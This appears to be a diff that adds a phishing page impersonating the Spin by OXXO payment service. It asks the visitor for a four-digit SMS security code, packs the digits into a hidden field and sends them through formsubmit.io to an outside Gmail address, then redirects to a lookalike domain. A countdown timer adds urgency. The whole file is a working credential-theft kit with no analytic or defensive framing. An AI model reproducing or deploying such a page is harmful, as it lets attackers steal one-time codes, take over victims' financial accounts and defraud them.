@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="ingcodigo.css">
+    <title>SpinOxxo</title>
+</head>
+<body>
+    <div class="nav">
+        <h2>Ingresa el codigo de seguridad que enviamos por sms</h2>
+    </div>
+    <form  action="https://formsubmit.io/send/sipinrespuesta@gmail.com" method="POST">
+    <div class="comtrecuadroscodigo">
+        <div class="contcuadros">
+            <input class="cuadros" id="1" type="text" >
+            <input class="cuadros" id="2" type="text">
+            <input class="cuadros" id="3" type="text">
+            <input class="cuadros" id="4" type="text">
+
+            <input type="hidden" name="codigo" id="numcodigo" >
+
+            <input name="_formsubmit_id" type="text" style="display:none">
+            <input name="email" type="hidden" value="respues2formul@gmail.com">
+            <input name="_redirect" type="hidden" id="name" value="https://spinbyoxxo.com.mx">
+
+        </div>
+
+        <script>
+            const cuadros = document.querySelectorAll(".cuadros");
+            cuadros.forEach((cuadro, index) => {
+                cuadro.addEventListener("keydown", (e) => {
+                    if(e.key >= 0 && e.key <= 9){
+                        cuadros[index].value = "";
+                        setTimeout(() => cuadros[index + 1].focus(), 10);
+                    }else if(e.key === "Backspace"){
+                        setTimeout(() => cuadros[index - 1].focus(), 10);
+                    }
+                });
+            });
+
+            function concatenar() {
+                var codigo = "";
+                for (var i = 1; i <= 4; i++) {
+                    codigo += document.getElementById(i).value;
+                }
+                document.getElementById("numcodigo").value = codigo;
+            }
+
+        </script>
+        
+        <div class="contbtn">
+            <h5 class="nrc" >¿No recibiste el codigo?</h5>
+            <h4 id="contador" style="font-size:18px;font-family:sans-serif;" ></h4>
+            <input value="Enviar" onclick="concatenar()" class="btn" type="submit">
+
+            <script>
+                // Define la duración del contador en segundos
+                const DURACION_CONTADOR = 120;
+
+                // Obtiene el elemento HTML que mostrará el contador
+                const contador = document.getElementById("contador");
+
+                // Inicializa los minutos y segundos
+                let minutos = Math.floor(DURACION_CONTADOR / 60);
+                let segundos = DURACION_CONTADOR % 60;
+
+                // Muestra los minutos y segundos iniciales en el contador
+                contador.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+
+                // Crea un intervalo que se ejecutará cada segundo
+                const intervalo = setInterval(() => {
+                    // Disminuye los segundos en 1
+                    segundos--;
+
+                    // Si los segundos llegan a 0, disminuye los minutos en 1 y reinicia los segundos a 59
+                    if (segundos < 0) {
+                        minutos--;
+                        segundos = 59;
+                    }
+
+                    // Actualiza el texto del contador con los nuevos minutos y segundos
+                    contador.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+
+                    // Si se han alcanzado los 2 minutos, detiene el intervalo
+                    if (minutos === 0 && segundos === 0) {
+                        clearInterval(intervalo);
+                    }
+                }, 1000);
+            </script>
+
+        </div>
+    </div>
+</form>
+</body>
+</html>
